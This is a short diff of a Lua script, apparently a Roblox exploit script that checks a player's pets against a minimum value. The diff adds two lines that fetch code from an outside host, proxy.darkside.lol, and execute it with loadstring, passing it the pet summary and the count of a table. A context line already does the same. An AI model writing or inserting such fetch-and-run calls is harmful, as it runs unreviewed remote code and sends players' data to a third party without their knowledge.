@@ -58,6 +58,8 @@ big=big.."(TEST)"
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
 else
 big = "No pets over 1/".._G.Min.." :("
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(#tab))
 end
 end)
 if not qbig then
